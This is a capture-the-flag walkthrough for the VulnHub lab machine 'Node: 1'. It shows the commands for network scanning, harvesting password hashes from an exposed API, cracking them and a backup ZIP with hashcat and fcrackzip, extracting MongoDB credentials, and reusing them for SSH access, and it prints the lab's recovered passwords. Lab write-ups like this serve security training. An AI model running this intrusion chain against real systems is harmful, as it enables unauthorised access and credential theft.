# Node: 1

- **Machine:** Node: 1
- **Download:** https://www.vulnhub.com/entry/node-1,252/

![](images/775-1.png)

---

# Setup

1. Import the `.ova` file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](images/775-2.png)

---

## Full Nmap Scan

Run a complete scan to enumerate open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.229
```

![](images/775-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.229
```

```bash
nmap -sC -sV -A 192.168.2.229
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.229
```

---

# Web Enumeration

Visit the Node.js application.

- http://192.168.2.229:3000/

Inspect the page source.

![](images/775-4.png)

---

## JavaScript Analysis

Visit the JavaScript controller.

```text
http://192.168.2.229:3000/assets/js/app/controllers/home.js
```

![](images/775-5.png)

---

## API Enumeration

Enumerate the exposed API endpoint.

```text
http://192.168.2.229:3000/api/users
```

![](images/775-6.png)

The API exposes usernames and password hashes.

| Username | Password Hash |
|----------|---------------|
| myP14ceAdm1nAcc0uNT | dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af |
| tom | f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240 |
| mark | de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73 |
| rastating | 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0 |

These hashes appear to be **SHA-256**.

---

# Password Cracking

Create a file containing the hashes.

```bash
vim hashes.txt
```

Paste the hashes.

```text
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
```

Crack the hashes using Hashcat.

```bash
hashcat -m 1400 hashes.txt /opt/rockyou.txt
```

Recovered credentials:

```text
myP14ceAdm1nAcc0uNT : manchester
tom                : spongebob
mark               : snowflake
```

---

# Web Login

Login to the application.

```text
http://192.168.2.229:3000/login
```

![](images/775-7.png)

After logging in, click **Download Backup**.

![](images/775-8.png)

---

# Backup Analysis

The downloaded backup is Base64 encoded.

Decode it.

```bash
base64 -d myplace.backup > backup.zip
```

Verify the archive.

```bash
file backup.zip
```

---

## Crack the ZIP Password

Use **fcrackzip** with the RockYou wordlist.

```bash
fcrackzip -u -D -p /opt/rockyou.txt backup.zip
```

Recovered ZIP password:

```text
magicword
```

Extract the archive.

```bash
unzip backup.zip
```

![](images/775-9.png)

---

# Search for Credentials

Search recursively for MongoDB connection strings.

```bash
grep -R "mongodb://" var/www/myplace/
```

Recovered credentials:

```text
const url = 'mongodb://mark:5AYRFt73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
```

![](images/775-10.png)

---

# SSH Access

Reuse the recovered credentials to login via SSH.

```bash
ssh mark@192.168.2.229
```

Password:

```text
5AYRFt73VtFpc84k
```

![](images/775-11.png)

Successfully obtained an interactive SSH shell.

---

# Key Learning

- Inspect client-side JavaScript for hidden API endpoints.
- Public APIs may expose sensitive user information.
- Identify password hash formats before cracking.
- Backup files often contain sensitive application data.
- Search extracted source code for database credentials.
- Developers frequently reuse credentials across different services.

---

# Summary

The attack began by enumerating a Node.js web application and discovering an exposed API endpoint containing user password hashes. After cracking the SHA-256 hashes with **Hashcat**, valid web credentials were obtained. The application allowed downloading a Base64-encoded backup, which was decoded and extracted after recovering the ZIP password with **fcrackzip**. Searching the extracted source code revealed MongoDB credentials that were successfully reused for SSH authentication, providing shell access to the target machine.